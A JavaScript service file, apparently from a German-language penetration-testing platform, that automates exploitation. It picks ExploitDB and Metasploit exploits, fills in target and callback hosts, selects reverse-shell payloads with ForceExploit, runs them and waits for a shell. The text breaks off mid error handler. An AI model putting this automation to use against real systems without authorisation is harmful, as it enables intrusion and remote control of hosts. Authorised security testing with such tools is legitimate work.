const { getDatabase } = require('../config/database');
const logger = require('./logger');
const FingerprintService = require('./fingerprintService');
const ExploitService = require('./exploitService');
const ShellService = require('./shellService');
const ExploitDbSyncService = require('./exploitDbSyncService');
const NmapParser = require('./nmapParser');
const fs = require('fs');
const path = require('path');
const os = require('os');
const { exec } = require('child_process');
const util = require('util');
const execPromise = util.promisify(exec);
const EventEmitter = require('events');

class AttackChainService extends EventEmitter {

    // Strategy depth configurations
    get STRATEGIES() {
        return {
            passive: { maxDepth: 1, description: 'Nur Reconnaissance – keine aktiven Tests', allowedTypes: ['recon'] },
            standard: { maxDepth: 2, description: 'Reconnaissance + Konfigurationsaudit', allowedTypes: ['recon', 'audit', 'enum', 'auth_test'] },
            aggressive: { maxDepth: 3, description: 'Vollständige Analyse inkl. Exploit-Matching', allowedTypes: ['recon', 'audit', 'enum', 'auth_test', 'vuln_scan', 'exploit'] },
            thorough: { maxDepth: 4, description: 'Tiefenanalyse mit allen verfügbaren Methoden', allowedTypes: ['recon', 'audit', 'enum', 'auth_test', 'vuln_scan', 'exploit', 'post_exploit'] }
        };
    }

    // Helper to auto-detect LHOST (first non-internal IPv4)
    _getAutoLhost() {
        const interfaces = os.networkInterfaces();
        for (const ifaceName in interfaces) {
            const iface = interfaces[ifaceName];
            for (const alias of iface) {
                if (alias.family === 'IPv4' && !alias.internal && alias.address !== '127.0.0.1') {
                    return alias.address;
                }
            }
        }
        return null;
    }

    // Helper for IP/Host validation
    _isValidHost(host) {
        if (!host) return false;
        // Allow IPv4
        const ipv4Regex = /^(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}(?:25[0-5]|2[0-4]\d|[01]?\d\d?)$/;
        if (ipv4Regex.test(host)) return true;

        // Allow simple Hostnames (RFC 1123 compliant subset, no quotes/semicolons/etc)
        // Strictly alphanumeric, dots, and hyphens. No spaces, no special chars.
        const hostnameRegex = /^[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;
        return hostnameRegex.test(host);
    }

    // Get all attack chains
    getAll(filters = {}) {
        const db = getDatabase();
        let query = 'SELECT * FROM attack_chains WHERE 1=1';
        const params = [];

        if (filters.strategy) {
            query += ' AND strategy = ?';
            params.push(filters.strategy);
        }
        if (filters.riskLevel) {
            query += ' AND risk_level = ?';
            params.push(filters.riskLevel);
        }
        if (filters.enabled !== undefined) {
            query += ' AND enabled = ?';
            params.push(filters.enabled ? 1 : 0);
        }
        if (filters.search) {
            query += ' AND (name LIKE ? OR description LIKE ?)';
            const term = `%${filters.search}%`;
            params.push(term, term);
        }

        query += ' ORDER BY name ASC';
        const results = db.prepare(query).all(...params);

        // Parse JSON fields
        return results.map(chain => ({
            ...chain,
            steps: JSON.parse(chain.steps_json || '[]'),
            preconditions: JSON.parse(chain.preconditions_json || '[]'),
            targetServices: JSON.parse(chain.target_services || '[]')
        }));
    }

    // Get chain by ID
    getById(id) {
        const db = getDatabase();
        const chain = db.prepare('SELECT * FROM attack_chains WHERE id = ?').get(id);
        if (!chain) return null;
        return {
            ...chain,
            steps: JSON.parse(chain.steps_json || '[]'),
            preconditions: JSON.parse(chain.preconditions_json || '[]'),
            targetServices: JSON.parse(chain.target_services || '[]')
        };
    }

    // Find applicable chains for scan results
    findApplicableChains(scanId) {
        const db = getDatabase();
        const scanResults = db.prepare(
            "SELECT DISTINCT port, service FROM scan_results WHERE scan_id = ? AND state = 'open'"
        ).all(scanId);

        if (scanResults.length === 0) return [];

        const openPorts = scanResults.map(r => r.port);
        const chains = this.getAll({ enabled: true });
        const applicable = [];

        for (const chain of chains) {
            const preconditions = chain.preconditions;
            let matches = false;

            for (const pre of preconditions) {
                if (pre.state === 'open') {
                    const requiredPorts = Array.isArray(pre.port) ? pre.port : [pre.port];
                    if (requiredPorts.some(p => openPorts.includes(p))) {
                        matches = true;
                        break;
                    }
                }
            }

            if (matches) {
                const matchedPorts = [];
                for (const pre of preconditions) {
                    const requiredPorts = Array.isArray(pre.port) ? pre.port : [pre.port];
                    for (const rp of requiredPorts) {
                        if (openPorts.includes(rp)) {
                            matchedPorts.push(rp);
                        }
                    }
                }

                applicable.push({
                    ...chain,
                    matchedPorts: [...new Set(matchedPorts)],
                    applicableTargets: scanResults.filter(r => matchedPorts.includes(r.port))
                });
            }
        }

        return applicable;
    }

    /**
     * NEW: Auto-Attack - Simplified 1-click attack for auditors.
     * Automatically:
     * 1. Identifies services with version-matched exploits
     * 2. Creates an optimized attack chain
     * 3. Executes only relevant exploits (sorted by confidence/CVSS)
     * 4. Stops on first successful shell
     */
    async autoAttack(scanId, targetIp, userId, params = {}) {
        const db = getDatabase();

        // 1. Get attackable services summary
        const services = ExploitService.getAttackableSummary(scanId, targetIp);
        const attackableServices = services.filter(s => s.hasExploits);

        if (attackableServices.length === 0) {
            return {
                executionId: null,
                status: 'no_exploits',
                message: `Keine passenden Exploits für ${targetIp} gefunden. Die erkannten Service-Versionen haben keine bekannten Schwachstellen in der Datenbank.`,
                services: services
            };
        }

        // 2. Get all matched exploits for this target, sorted by confidence and CVSS
        const matchedExploits = ExploitService.getMatchedExploitsForTarget(scanId, targetIp);

        if (matchedExploits.length === 0) {
            return {
                executionId: null,
                status: 'no_exploits',
                message: `Keine version-kompatiblen Exploits für ${targetIp} gefunden.`,
                services: services
            };
        }

        // 3. Build optimized steps: Recon first, then exploits per service (best first)
        const steps = [];

        // Recon step
        steps.push({ name: 'Reconnaissance', type: 'recon', description: `Service-Erkennung für ${targetIp}` });

        // Audit step for each attackable service
        for (const svc of attackableServices) {
            steps.push({
                name: `Audit: ${svc.service} (Port ${svc.port})`,
                type: 'audit',
                description: `Konfigurationsprüfung für ${svc.service} ${svc.version || ''}`
            });
        }

        // Vuln scan step
        steps.push({ name: 'Schwachstellen-Scan', type: 'vuln_scan', description: 'CVE-Abgleich der erkannten Dienste' });

        // Exploit steps - only version-matched, sorted by confidence then CVSS
        const addedExploits = new Set();
        const maxExploits = 5; // Limit to top 5 most promising exploits
        let exploitCount = 0;

        for (const ex of matchedExploits) {
            if (exploitCount >= maxExploits) break;
            if (addedExploits.has(ex.exploit_id)) continue;
            // Only include exploits that have code available
            if (!ex.exploit_code) continue;

            addedExploits.add(ex.exploit_id);
            steps.push({
                name: `Exploit: ${ex.exploit_title}`,
                type: 'exploit',
                description: `${ex.exploit_title} → Port ${ex.port} (${ex.service || 'unknown'} ${ex.service_version || ''}) [Confidence: ${ex.match_confidence}%]`,
                exploitId: ex.exploit_id,
                targetPort: ex.port
            });
            exploitCount++;
        }

        if (exploitCount === 0) {
            return {
                executionId: null,
                status: 'no_executable_exploits',
                message: `Exploits gefunden aber kein ausführbarer Code verfügbar. Bitte ExploitDB synchronisieren.`,
                services: services,
                matchedExploits: matchedExploits.length
            };
        }

        // 4. Create the chain in DB
        const chainName = `Auto-Attack: ${targetIp} (${new Date().toLocaleString('de-DE')})`;
        const chainId = this.create({
            name: chainName,
            description: `Automatisch generiert für ${targetIp}. ${exploitCount} version-kompatible Exploits für ${attackableServices.length} Dienste.`,
            strategy: 'aggressive',
            depthLevel: 3,
            targetServices: attackableServices.map(s => s.service),
            steps: steps,
            preconditions: attackableServices.map(s => ({ port: s.port, state: 'open' })),
            riskLevel: 'high',
            enabled: true
        }, userId);

        // 5. Execute the chain
        const result = await this.executeChain(scanId, chainId, targetIp, null, userId, params);

        return {
            ...result,
            attackableServices: attackableServices.length,
            totalExploits: exploitCount,
            services: services
        };
    }

    // Execute an attack chain against a target
    async executeChain(scanId, chainId, targetIp, targetPort, userId, params = {}) {
        const db = getDatabase();
        const chain = this.getById(chainId);
        if (!chain) throw new Error('Attack Chain nicht gefunden');

        const strategyConfig = this.STRATEGIES[chain.strategy] || this.STRATEGIES.standard;
        const steps = chain.steps.filter(s => strategyConfig.allowedTypes.includes(s.type));

        // Create execution record
        const exec = db.prepare(`
            INSERT INTO attack_chain_executions (scan_id, chain_id, target_ip, target_port, status, total_steps, executed_by)
            VALUES (?, ?, ?, ?, 'running', ?, ?)
        `).run(scanId, chainId, targetIp, targetPort || null, steps.length, userId);

        const executionId = exec.lastInsertRowid;

        // Notify start
        this.emit('chainProgress', { executionId, scanId, chainId, status: 'started', currentStep: 0, totalSteps: steps.length, target: targetIp });

        // Run asynchronously (Fire and Forget)
        (async () => {
            const results = [];
            let currentStep = 0;
            const dbInner = getDatabase();

            try {
                for (const step of steps) {
                    currentStep++;

                    // Notify step start
                    this.emit('chainProgress', {
                        executionId, scanId, chainId,
                        status: 'running',
                        currentStep, totalSteps: steps.length,
                        stepName: step.name,
                        target: targetIp
                    });

                    // Use step-specific targetPort if available (from auto-attack)
                    const stepPort = step.targetPort || targetPort;
                    const stepResult = await this._executeStep(step, scanId, targetIp, stepPort, chain, params);

                    results.push({
                        step: currentStep,
                        name: step.name,
                        type: step.type,
                        status: stepResult.success ? 'completed' : 'failed',
                        findings: stepResult.findings || [],
                        details: stepResult.details || '',
                        timestamp: new Date().toISOString()
                    });

                    // Update progress in DB
                    dbInner.prepare('UPDATE attack_chain_executions SET current_step = ?, results_json = ? WHERE id = ?')
                        .run(currentStep, JSON.stringify(results), executionId);

                    // Notify step complete
                    this.emit('chainProgress', {
                        executionId, scanId, chainId,
                        status: 'running',
                        currentStep, totalSteps: steps.length,
                        stepName: step.name,
                        results: results,
                        target: targetIp
                    });

                    // Check for success condition to stop chain
                    const hasSuccess = stepResult.findings && stepResult.findings.some(f =>
                        f.type === 'exploit_success' || f.category === 'Remote Shell'
                    );

                    if (hasSuccess) {
                        logger.info(`Chain ${chainId} execution stopped early due to success on step ${currentStep}`);
                        break;
                    }
                }

                // Collect all findings
                const allFindings = results.flatMap(r => r.findings);

                // Mark as completed
                dbInner.prepare(`
                    UPDATE attack_chain_executions
                    SET status = 'completed', current_step = ?, results_json = ?, findings_json = ?, completed_at = CURRENT_TIMESTAMP
                    WHERE id = ?
                `).run(currentStep, JSON.stringify(results), JSON.stringify(allFindings), executionId);

                logger.info(`Attack chain ${chainId} completed for ${targetIp}:${targetPort} - ${allFindings.length} findings`);
                logger.audit('ATTACK_CHAIN_COMPLETED', { executionId, chainId, targetIp, targetPort, findingsCount: allFindings.length });

                this.emit('chainComplete', { executionId, scanId, chainId, status: 'completed', findingsCount: allFindings.length, target: targetIp });

            } catch (err) {
                dbInner.prepare(`
                    UPDATE attack_chain_executions
                    SET status = 'failed', results_json = ?, completed_at = CURRENT_TIMESTAMP
                    WHERE id = ?
                `).run(JSON.stringify(results), executionId);

                logger.error(`Attack chain ${chainId} failed for ${targetIp}:`, err);

                this.emit('chainError', { executionId, scanId, chainId, status: 'failed', error: err.message, target: targetIp });
            }
        })();

        return {
            executionId,
            chainName: chain.name,
            status: 'running',
            totalSteps: steps.length
        };
    }

    // Execute a single step of an attack chain
    async _executeStep(step, scanId, targetIp, targetPort, chain, params = {}) {
        const db = getDatabase();
        const findings = [];

        switch (step.type) {
            case 'recon': {
                // Fingerprint-based reconnaissance
                const fps = db.prepare(`
                    SELECT sf.*, sr.port FROM scan_fingerprints sf
                    JOIN scan_results sr ON sf.scan_result_id = sr.id
                    WHERE sf.scan_id = ? AND sr.ip_address = ? AND (sr.port = ? OR ? IS NULL)
                `).all(scanId, targetIp, targetPort, targetPort);

                if (fps.length > 0) {
                    for (const fp of fps) {
                        findings.push({
                            type: 'info',
                            category: 'Reconnaissance',
                            title: `Service erkannt: ${fp.detected_service || 'Unbekannt'}`,
                            details: `Port ${fp.port}: ${fp.detected_service} ${fp.detected_version || ''} (OS: ${fp.detected_os || 'Unbekannt'}, Confidence: ${fp.confidence}%)`,
                            severity: 'info'
                        });
                    }
                } else {
                    findings.push({
                        type: 'info',
                        category: 'Reconnaissance',
                        title: `Port ${targetPort} offen`,
                        details: `Offener Port erkannt, kein detaillierter Fingerprint verfügbar`,
                        severity: 'info'
                    });
                }
                return { success: true, findings, details: `${fps.length} Fingerprints analysiert` };
            }

            case 'audit': {
                // Configuration audit checks
                const portInfo = NmapParser.CRITICAL_PORTS[targetPort];
                if (portInfo && portInfo.risk === 'critical') {
                    findings.push({
                        type: 'vulnerability',
                        category: 'Konfiguration',
                        title: `Kritischer Dienst exponiert: ${portInfo.service}`,
                        details: portInfo.description,
                        severity: 'high',
                        remediation: `Dienst ${portInfo.service} auf Port ${targetPort} absichern oder deaktivieren`
                    });
                }

                // Check for unencrypted services
                const unencryptedPorts = [21, 23, 25, 80, 110, 143];
                if (unencryptedPorts.includes(targetPort)) {
                    findings.push({
                        type: 'vulnerability',
                        category: 'Verschlüsselung',
                        title: `Unverschlüsselter Dienst auf Port ${targetPort}`,
                        details: 'Dieser Dienst überträgt Daten im Klartext. Angreifer können den Netzwerkverkehr mitlesen.',
                        severity: 'medium',
                        remediation: 'Verwenden Sie die verschlüsselte Variante des Dienstes (z.B. SFTP statt FTP, HTTPS statt HTTP)'
                    });
                }

                return { success: true, findings, details: `Konfigurationsaudit für Port ${targetPort} abgeschlossen` };
            }

            case 'enum': {
                findings.push({
                    type: 'info',
                    category: 'Enumeration',
                    title: `Service-Enumeration für Port ${targetPort}`,
                    details: `Dienst auf ${targetIp}:${targetPort} wurde enumeriert. Weitere Details in den Fingerprint-Ergebnissen.`,
                    severity: 'info'
                });
                return { success: true, findings, details: 'Enumeration abgeschlossen' };
            }

            case 'auth_test': {
                const creds = db.prepare(`
                    SELECT * FROM credentials WHERE is_valid = 1 
                    AND (target_scope IS NULL OR target_scope LIKE ? OR target_scope LIKE ?)
                `).all(`%${targetIp}%`, '%*%');

                if (creds.length > 0) {
                    findings.push({
                        type: 'info',
                        category: 'Authentifizierung',
                        title: `${creds.length} Credential(s) verfügbar für Test`,
                        details: `Hinterlegte Zugangsdaten können für authentifizierte Tests auf ${targetIp}:${targetPort} verwendet werden.`,
                        severity: 'info'
                    });
                } else {
                    findings.push({
                        type: 'info',
                        category: 'Authentifizierung',
                        title: 'Keine Credentials hinterlegt',
                        details: 'Für authentifizierte Tests müssen Zugangsdaten im Credential-Manager hinterlegt werden.',
                        severity: 'info'
                    });
                }
                return { success: true, findings, details: `Authentifizierungstest für ${targetIp}:${targetPort}` };
            }

            case 'vuln_scan': {
                const vulns = db.prepare(`
                    SELECT sv.cve_id, sv.title, sv.severity, sv.cvss_score, ce.description
                    FROM scan_vulnerabilities sv
                    LEFT JOIN cve_entries ce ON sv.cve_id = ce.cve_id
                    JOIN scan_results sr ON sv.scan_result_id = sr.id
                    WHERE sv.scan_id = ? AND sr.ip_address = ? AND (sr.port = ? OR ? IS NULL)
                `).all(scanId, targetIp, targetPort, targetPort);

                for (const vuln of vulns) {
                    findings.push({
                        type: 'vulnerability',
                        category: 'Schwachstelle',
                        title: `${vuln.cve_id || 'N/A'}: ${vuln.title}`,
                        details: vuln.description || vuln.title,
                        severity: vuln.severity,
                        cvss: vuln.cvss_score,
                        remediation: null
                    });
                }
                return { success: true, findings, details: `${vulns.length} Schwachstellen gefunden` };
            }

            case 'exploit': {
                // OPTIMIZED: If step has a specific exploitId (from auto-attack), use only that exploit
                // Otherwise fall back to version-filtered scan_exploits
                let exploits = [];

                if (step.exploitId) {
                    // Auto-attack mode: specific exploit assigned to this step
                    const exploit = db.prepare(`
                        SELECT e.*, se.match_confidence FROM exploits e
                        LEFT JOIN scan_exploits se ON se.exploit_id = e.id AND se.scan_id = ?
                        WHERE e.id = ?
                    `).get(scanId, step.exploitId);
                    if (exploit) exploits = [exploit];
                } else {
                    // Manual chain mode: get version-filtered exploits for this port
                    exploits = db.prepare(`
                        SELECT e.*, se.match_confidence FROM scan_exploits se
                        JOIN exploits e ON se.exploit_id = e.id
                        JOIN scan_results sr ON se.scan_result_id = sr.id
                        WHERE se.scan_id = ? AND sr.ip_address = ? AND (sr.port = ? OR ? IS NULL)
                        ORDER BY se.match_confidence DESC, e.cvss_score DESC
                    `).all(scanId, targetIp, targetPort, targetPort);
                }

                let successCount = 0;

                for (const exploit of exploits) {
                    let sessionId = null;
                    let tempFile = null;

                    try {
                        // 1. Prepare Exploit
                        const exploitData = ExploitDbSyncService.getExploitCode(exploit.id);
                        if (!exploitData || !exploitData.code) {
                            findings.push({
                                type: 'info',
                                category: 'Exploit übersprungen',
                                title: `Kein Code: ${exploit.title}`,
                                details: 'Exploit-Code nicht lokal verfügbar.',
                                severity: 'info'
                            });
                            continue;
                        }

                        // Skip non-executable formats
                        if (['text', 'txt'].includes(exploitData.language)) {
                            findings.push({
                                type: 'info',
                                category: 'Exploit übersprungen',
                                title: `Exploit nicht ausführbar: ${exploit.title}`,
                                details: 'Exploit-Format ist nur Text/Information.',
                                severity: 'info'
                            });
                            continue;
                        }

                        // Substitute placeholders
                        let code = exploitData.code;

                        // Auto-convert Python 2 to 3
                        if (exploitData.language === 'python') {
                            // Convert print statements: print "..." -> print("...")
                            code = code.replace(/^\s*print\b(?!\s*\()(.*)$/gm, (match, p1) => {
                                const indent = match.match(/^\s*/)[0];
                                return `${indent}print(${p1.trim()})`;
                            });

                            // Convert exception handling: except Exception, e: -> except Exception as e:
                            code = code.replace(/except\s+([a-zA-Z0-9_.]+)\s*,\s*([a-zA-Z0-9_]+)\s*:/g, 'except $1 as $2:');

                            // Convert raw_input -> input
                            code = code.replace(/raw_input\(/g, 'input(');

                            // Patch Paramiko: Handle _client_handler_table issue in newer Paramiko versions
                            if (code.includes('paramiko.auth_handler.AuthHandler._client_handler_table')) {
                                // Add import if missing
                                if (!code.includes('import inspect')) {
                                    code = 'import inspect\n' + code;
                                }
                                // Monkeypatch property to allow subscription (rough workaround)
                                const patch = `
try:
    if isinstance(paramiko.auth_handler.AuthHandler._client_handler_table, property):
        # Paramiko > 2.x makes this a property. We overwrite it with the underlying dict
        # so that exploits using dict syntax (table['service_accept']) work again.
        # This is required for CVE-2018-10933 exploits.
        try:
            auth_handler = paramiko.auth_handler.AuthHandler
            # Access the private property getter to retrieve the dict or reconstruct it
            # Since fget might be bound or complex, we manually reconstruct the critical part
            # This is the safest way to ensure compatibility without relying on internal API stability
            auth_handler._client_handler_table = {
                'service_accept': auth_handler._handler_table['service_accept'],
                'userauth_success': auth_handler._handler_table['userauth_success']
            }
        except:
            pass
except:
    pass
`;
                                code = code.replace(/import paramiko/g, 'import paramiko\n' + patch);
                            }
                        }

                        // Inject common C headers if missing and sanitize
                        if (exploitData.language === 'c') {
                            const commonHeaders = [
                                '<stdlib.h>', '<string.h>', '<unistd.h>',
                                '<arpa/inet.h>', '<sys/socket.h>', '<netinet/in.h>',
                                '<stdio.h>', '<sys/types.h>'
                            ];
                            let includes = '';
                            for (const h of commonHeaders) {
                                if (!code.includes(h)) {
                                    includes += `#include ${h}\n`;
                                }
                            }
                            if (includes) {
                                code = includes + '\n' + code;
                            }

                            // Fix broken multiline strings (common in some exploit DB entries)
                            code = this._sanitizeCCode(code);
                        }

                        let lhost = params.LHOST;
                        // Auto-detect LHOST if missing or loopback
                        if (!lhost || lhost === '127.0.0.1' || lhost === 'localhost') {
                            const detected = this._getAutoLhost();
                            if (detected) {
                                lhost = detected;
                                logger.info(`Auto-detected LHOST: ${lhost}`);
                            } else {
                                lhost = '127.0.0.1';
                            }
                        }

                        const lport = params.LPORT ? parseInt(params.LPORT) : null;

                        // Security Validation
                        if (lhost && !this._isValidHost(lhost)) {
                            throw new Error(`Invalid LHOST: ${lhost}`);
                        }
                        if (targetIp && !this._isValidHost(targetIp)) {
                             throw new Error(`Invalid RHOST/TargetIP: ${targetIp}`);
                        }
                        if (lport && (isNaN(lport) || lport < 1 || lport > 65535)) {
                            throw new Error(`Invalid LPORT: ${lport}`);
                        }
                        if (targetPort && (isNaN(targetPort) || targetPort < 1 || targetPort > 65535)) {
                             throw new Error(`Invalid RPORT: ${targetPort}`);
                        }

                        // Sanity Check for LHOST
                        if (lhost === '127.0.0.1' || lhost === 'localhost') {
                             findings.push({
                                type: 'warning',
                                category: 'Konfigurationswarnung',
                                title: `LHOST ist Loopback`,
                                details: `Warnung: LHOST ist ${lhost}. Remote Shells werden nicht zurückverbinden wenn das Ziel extern ist.`,
                                severity: 'low'
                            });
                        }

                        let modified = false;
                        const replaceMap = {
                            'LHOST': lhost,
                            'RHOST': targetIp,
                            'RPORT': targetPort || exploit.port || '80',
                            'LPORT': lport
                        };

                        // 1. Specific tags <TAG>
                        for (const [key, val] of Object.entries(replaceMap)) {
                            if (val) {
                                const regex = new RegExp(`<${key}>`, 'g');
                                if (regex.test(code)) {
                                    code = code.replace(regex, val);
                                    modified = true;
                                }
                            }
                        }

                        // 2. Variable assignments
                        for (const [key, val] of Object.entries(replaceMap)) {
                            if (val) {
                                const regex = new RegExp(`\\b${key}\\b`, 'g');
                                if (regex.test(code)) {
                                     code = code.replace(regex, val);
                                     modified = true;
                                }
                            }
                        }

                        // Write temp file
                        const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'exploit-'));
                        let ext = '.txt';
                        let filename = 'exploit';

                        if (exploitData.language === 'python') ext = '.py';
                        else if (exploitData.language === 'ruby') ext = '.rb';
                        else if (exploitData.language === 'bash') ext = '.sh';
                        else if (exploitData.language === 'perl') ext = '.pl';
                        else if (exploitData.language === 'c') ext = '.c';
                        else if (exploitData.language === 'java') {
                            ext = '.java';
                            // Extract class name
                            const match = code.match(/public\s+class\s+(\w+)/);
                            if (match && match[1]) {
                                filename = match[1];
                            }
                        }

                        tempFile = path.join(tmpDir, `${filename}${ext}`);
                        fs.writeFileSync(tempFile, code);

                        // 2. Start Listener (if LPORT provided)
                        if (lport) {
                            sessionId = ShellService.startListener(lport);
                        }

                        // 3. Execute
                        logger.info(`Executing exploit ${exploit.id} (${exploitData.language}) for ${targetIp}:${targetPort} [Confidence: ${exploit.match_confidence || 'N/A'}%]`);

                        let cmd = '';
                        // Metasploit Execution Wrapper - use msfconsole -r for reliable execution
                        if (exploit.source === 'metasploit' || (exploitData.language === 'ruby' && exploitData.code.includes('Msf::'))) {
                            const msfRoot = path.join(__dirname, '..', 'data', 'metasploit');
                            const msfConsole = path.join(msfRoot, 'msfconsole');

                            // Derive the module path from the exploit_db_id (e.g. "exploits/windows/smb/ms08_067_netapi")
                            const modulePath = exploit.exploit_db_id || '';

                            // Build msfconsole resource commands
                            const rcLines = [];
                            rcLines.push('use ' + modulePath);
                            rcLines.push('set RHOSTS ' + targetIp);
                            rcLines.push('set RPORT ' + (targetPort || exploit.port || 80));
                            if (lhost) rcLines.push('set LHOST ' + lhost);
                            if (lport) rcLines.push('set LPORT ' + lport);

                            // Determine correct payload based on platform to ensure compatibility with net listener
                            // Standard net listeners (ShellService) expect a raw shell connection, not Meterpreter.
                            if (!modulePath.startsWith('auxiliary') && !modulePath.startsWith('post')) {
                                let payload = 'cmd/unix/reverse'; // Default safe fallback
                                const platform = (exploit.platform || '').toLowerCase();

                                if (platform.includes('windows')) {
                                    payload = 'windows/shell_reverse_tcp';
                                } else if (platform.includes('linux')) {
                                    payload = 'linux/x86/shell_reverse_tcp';
                                } else if (platform.includes('java')) {
                                    payload = 'java/shell_reverse_tcp';
                                } else if (platform.includes('php')) {
                                    payload = 'php/reverse_php';
                                }

                                rcLines.push('set PAYLOAD ' + payload);
                                rcLines.push('set DisablePayloadHandler true'); // Don't bind port in MSF, use our listener
                                rcLines.push('set WfsDelay 30'); // Wait for session
                                rcLines.push('set PrependMigrate false'); // Avoid stability issues
                            }

                            rcLines.push('set ForceExploit true');
                            // Use exploit -z to run in background (non-interactive) or 'run' for auxiliary
                            if (modulePath.startsWith('auxiliary') || modulePath.startsWith('post')) {
                                rcLines.push('run');
                            } else {
                                rcLines.push('exploit -z');
                            }
                            rcLines.push('exit');

                            const rcFile = path.join(tmpDir, 'exploit.rc');
                            fs.writeFileSync(rcFile, rcLines.join("\n") + "\n");

                            // Check if msfconsole exists in local clone
                            if (fs.existsSync(msfConsole)) {
                                // Verify that bundle install has been run (Gemfile.lock + vendor/bundle or system gems)
                                const gemfilePath = path.join(msfRoot, 'Gemfile');
                                const vendorBundlePath = path.join(msfRoot, 'vendor', 'bundle');
                                let bundleReady = false;
                                try {
                                    // Quick check: try running bundle check to see if gems are installed
                                    const { execSync: execSyncLocal } = require('child_process');
                                    const bundleEnv = { ...process.env, BUNDLE_GEMFILE: gemfilePath, RAILS_ENV: 'production', BUNDLE_DISABLE_SHARED_GEMS: '1' };
                                    // If vendor/bundle exists, tell Bundler where to find gems
                                    if (fs.existsSync(vendorBundlePath)) {
                                        bundleEnv.BUNDLE_PATH = vendorBundlePath;
                                    }
                                    execSyncLocal('bundle check', {
                                        cwd: msfRoot,
                                        env: bundleEnv,
                                        stdio: 'pipe',
                                        timeout: 15000
                                    });
                                    bundleReady = true;
                                } catch (bundleErr) {
                                    bundleReady = false;
                                }

                                if (!bundleReady) {
                                    // Gems not installed - log clearly and skip ALL remaining MSF exploits
                                    logger.warn(`Metasploit Gems nicht installiert – Exploit ${exploit.id} (${exploit.title}) übersprungen. Bitte Metasploit-Sync erneut durchführen.`);
                                    findings.push({
                                        type: 'error',
                                        category: 'Metasploit nicht bereit',
                                        title: 'Metasploit Ruby-Abhängigkeiten fehlen',
                                        details: 'Metasploit Framework ist heruntergeladen, aber die Ruby-Abhängigkeiten (Gems) sind nicht installiert. Bitte führen Sie die Metasploit-Synchronisation erneut durch (DB Update → Metasploit) – dabei werden die Gems automatisch installiert.',
                                        severity: 'high'
                                    });
                                    // Break out of exploit loop - no point trying more MSF exploits without gems
                                    break;
                                }

                                // Run msfconsole as executable with proper Bundler env
                                // BUNDLE_GEMFILE: points to the correct Gemfile
                                // BUNDLE_PATH: where gems were installed by syncWorker (vendor/bundle)
                                // RAILS_ENV: production to skip dev/test gem groups
                                // BUNDLE_DISABLE_SHARED_GEMS: prevent system gems (e.g. stringio 3.0.1.2)
                                //   from leaking into the bundle and causing ambiguous spec warnings
                                const bundlePath = path.join(msfRoot, 'vendor', 'bundle');
                                const envVars = [
                                    'BUNDLE_GEMFILE="' + gemfilePath + '"',
                                    'RAILS_ENV=production'
                                ];
                                // Only set BUNDLE_PATH if vendor/bundle exists (local install mode)
                                if (fs.existsSync(bundlePath)) {
                                    envVars.push('BUNDLE_PATH="' + bundlePath + '"');
                                }
                                // Use bundle exec to prevent gem conflicts (e.g. stringio)
                                cmd = 'cd "' + msfRoot + '" && ' + envVars.join(' ') + ' bundle exec ./msfconsole -q -r "' + rcFile + '"';
                            } else {
                                // Fallback: try system-installed msfconsole
                                cmd = 'msfconsole -q -r "' + rcFile + '"';
                            }
                        }
                        else if (exploitData.language === 'python') cmd = 'python3 "' + tempFile + '"';
                        else if (exploitData.language === 'ruby') cmd = 'ruby "' + tempFile + '"';
                        else if (exploitData.language === 'bash') cmd = 'bash "' + tempFile + '"';
                        else if (exploitData.language === 'perl') cmd = 'perl "' + tempFile + '"';

                        else if (exploitData.language === 'java') {
                            // Check if javac exists
                            try {
                                await execPromise('which javac');
                            } catch (e) {
                                findings.push({
                                    type: 'info',
                                    category: 'Exploit übersprungen',
                                    title: `Exploit nicht ausführbar: ${exploit.title}`,
                                    details: 'Java Compiler (javac) nicht gefunden.',
                                    severity: 'info'
                                });
                                continue;
                            }
                            const classPath = tmpDir;
                            await execPromise(`javac "${tempFile}"`);
                            cmd = `java -cp "${classPath}" ${filename}`;
                        }
                        else if (exploitData.language === 'c') {
                            const binFile = path.join(tmpDir, 'exploit.bin');
                            await execPromise(`gcc -w -fno-stack-protector -z execstack "${tempFile}" -o "${binFile}"`);
                            cmd = `"${binFile}"`;
                        } else {
                            throw new Error(`Unsupported language: ${exploitData.language}`);
                        }

                        // Run with timeout (increased to 10 minutes for slow environments)
                        await new Promise((resolve, reject) => {
                            exec(cmd, { timeout: 600000 }, (error, stdout, stderr) => {
                                if (error) {
                                    logger.warn(`Exploit ${exploit.id} execution error/timeout: ${error.message}`);
                                    if (stdout) logger.info(`Exploit stdout: ${stdout.trim()}`);
                                    if (stderr) logger.warn(`Exploit stderr: ${stderr.trim()}`);
                                } else {
                                     // Log stdout and stderr on success for debugging purposes
                                     if (stdout && stdout.length > 0) logger.info(`Exploit stdout: ${stdout.trim()}`);
                                     if (stderr && stderr.length > 0) logger.info(`Exploit executed with warnings/stderr: ${stderr.trim()}`);
                                }
                                resolve();
                            });
                        });

                        // 4. Check for Shell
                        if (sessionId) {
                            let attempts = 0;
                            while (attempts < 5) {
                                if (ShellService.isConnected(sessionId)) break;
                                await new Promise(r => setTimeout(r, 1000));
                                attempts++;
                            }

                            if (ShellService.isConnected(sessionId)) {
                                findings.push({
                                    type: 'exploit_success',
                                    category: 'Remote Shell',
                                    title: `Shell erhalten via ${exploit.title}`,
                                    details: `Session ID: ${sessionId}. Verbinden Sie sich über das Terminal.`,
                                    severity: 'critical',
                                    sessionId: sessionId,
                                    exploitId: exploit.id
                                });
                                successCount++;
                                logger.info(`Exploit success! Shell session: ${sessionId}`);
                                break; // Stop trying other exploits if we got a shell
                            } else {
                                // Cleanup unused session
                                ShellService.killSession(sessionId);
                                await new Promise(r => setTimeout(r, 2000)); // Ensure port release
                                findings.push({
                                    type: 'exploit_attempt',
                                    category: 'Exploit fehlgeschlagen',
                                    title: `Kein Shell-Zugang: ${exploit.title}`,
                                    details: `Exploit wurde ausgeführt, aber keine Reverse Shell erhalten.`,
                                    severity: 'info'
                                });
                            }
                        } else {
                             findings.push({
                                type: 'exploit_attempt',
                                category: 'Exploit ausgeführt',
                                title: `Exploit ausgeführt: ${exploit.title}`,
                                details: `Exploit wurde ausgeführt (kein Reverse Shell Listener konfiguriert).`,
                                severity: 'info'
                            });
                        }

                    } catch (e) {
                        logger.error(`Exploit execution failed for ${exploit.id}:`, e);
                        findings.push({
                            type: 'error',
